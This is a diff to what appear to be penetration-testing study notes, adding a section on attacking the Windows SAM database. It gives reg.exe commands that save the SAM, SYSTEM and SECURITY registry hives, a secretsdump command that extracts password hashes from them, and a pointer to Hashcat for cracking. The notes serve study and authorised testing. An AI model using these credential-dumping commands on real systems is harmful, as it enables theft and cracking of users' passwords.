@@ -117,6 +117,27 @@ A pretty common format for a user to do is:
 
 The [DefaultCreds-Cheat-Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet) contains a list of many default credentials for common applications, often these default credentials can be forgotten or overlooked when configuring infrastructure which can lead to easy access of the system.
 
-## Attacking SAM
+## Windows
+
+### Attacking SAM
 > Ref: [[Windows#Security Account Manager (SAM)]]
 
+There are 3 registry hives (*we need local admin access to get*) that are useful for dumping and cracking hashes from the SAM db.
+- `hklm\sam` - Hashes for local account passwords
+- `hklm\system` - Contains the system boot key that is used to encrypt the SAM database
+- `hklm\security` - Contains cached credentials for domain accounts (*useful if wea re attacking a domain-joined windows target*)
+
+We can use the `reg.exe` utility to copy the registry hives. Once saved, we just need to [[Operating Systems/Windows/File Transfer|File Transfer]] them back to our attack machine.
+```cmd
+C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
+C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
+C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
+```
+> These techniques are well-known so may raise alarms, the [MITRE](https://attack.mitre.org/techniques/T1003/002/) website documents a variety of tools that can also do this same dumping
+
+Once on the attack machine, we can use Impacket's `secretsdump.py` tool to grab the hashes using the three files.
+```sh
+$ secretsdump -sam sam.save -security security.save -system system.save LOCAL
+```
+
+We can then use a tool like [[Hashcat]] to offline crack the NT (*NTLM*) or LM hashes that have been dumped
